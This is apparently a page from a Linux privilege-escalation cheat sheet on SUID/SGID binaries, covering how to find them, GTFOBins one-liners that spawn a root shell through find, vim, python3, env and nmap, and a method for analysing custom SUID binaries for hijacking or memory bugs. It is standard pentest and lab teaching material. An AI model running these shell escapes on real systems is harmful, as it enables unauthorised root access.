# SUID / SGID

## Table of Contents

1. [Overview](#overview)
2. [How to Find SUID/SGID Binaries](#how-to-find-suidsgid-binaries)
3. [Exploitation via GTFOBins](#exploitation-via-gtfobins)
4. [Custom SUID Binary Exploitation](#custom-suid-binary-exploitation)

---

## Overview

When a binary has the **SUID** bit set, any user who executes it runs it with the **UID of the file's owner** (usually root). When the **SGID** bit is set, the process runs with the **GID of the file's group**.

```bash
# SUID: the 's' in owner execute position
-rwsr-xr-x 1 root root  ... /usr/bin/passwd

# SGID: the 's' in group execute position
-rwxr-sr-x 1 root shadow ... /usr/bin/expiry
```

This is how `passwd` can write to `/etc/shadow` even when run by a normal user. The risk is when a SUID root binary has unintended functionality that can be abused.

## How to Find SUID/SGID Binaries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both
find / -perm /6000 -type f 2>/dev/null

# Focus on non-standard ones (filter out known safe binaries)
find / -perm -4000 -type f 2>/dev/null | grep -vE '(ping|su|sudo|passwd|mount|umount|chfn|chsh|newgrp|gpasswd|pkexec)'
```

The last command is the most useful — standard SUID binaries are expected. Focus on anything unusual, custom, or outdated.

## Exploitation via GTFOBins

[GTFOBins](https://gtfobins.github.io/#+suid) lists known binaries that can be abused when SUID is set.

Common examples:

```bash
# find
find . -exec /bin/bash -p \; -quit

# vim
vim -c ':!/bin/bash'

# python3
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# bash (if SUID)
bash -p

# env
env /bin/bash -p

# nmap (old versions with interactive mode)
nmap --interactive
!sh
```

> **Note:** The `-p` flag on bash prevents it from dropping the effective UID. Without it, bash resets euid to the real uid and you lose the SUID privilege.

## Custom SUID Binary Exploitation

When the SUID binary is not on GTFOBins, it is a custom or uncommon binary. Approach:

### 1. Analyze the binary

```bash
# Check what it does
strings /path/to/suid_binary
ltrace /path/to/suid_binary
strace /path/to/suid_binary

# Check for relative command calls (→ PATH hijacking)
strings /path/to/suid_binary | grep -vE '^/'

# Check shared libraries (→ shared library hijacking)
ldd /path/to/suid_binary
readelf -d /path/to/suid_binary | grep -E 'RPATH|RUNPATH'
```

### 2. Common vulnerability patterns

| Pattern | What to look for | Exploitation |
|---|---|---|
| Calls commands without absolute path | `system("service restart")` | [PATH hijacking](../hijacking/path-hijacking.md) |
| Loads shared libraries | Missing `.so` or writable RPATH | [Shared library hijacking](../hijacking/shared-library.md) |
| Reads user-controlled input | `gets()`, `strcpy()`, no bounds checking | Buffer overflow |
| Runs with environment variables | Uses `getenv()` | Environment variable injection |
| Calls other scripts | `system("./script.sh")` | [Relative path exploitation](../hijacking/relative-path.md) |

### 3. Binary exploitation (pwn)

If the binary has memory corruption vulnerabilities:

```bash
# Check protections
checksec /path/to/suid_binary

# Debug (SUID is dropped in gdb, use a copy)
cp /path/to/suid_binary /tmp/copy
gdb /tmp/copy
```

Key protections to check: NX (no-execute stack), ASLR, PIE, stack canaries, RELRO. The exploitation technique depends on which protections are enabled.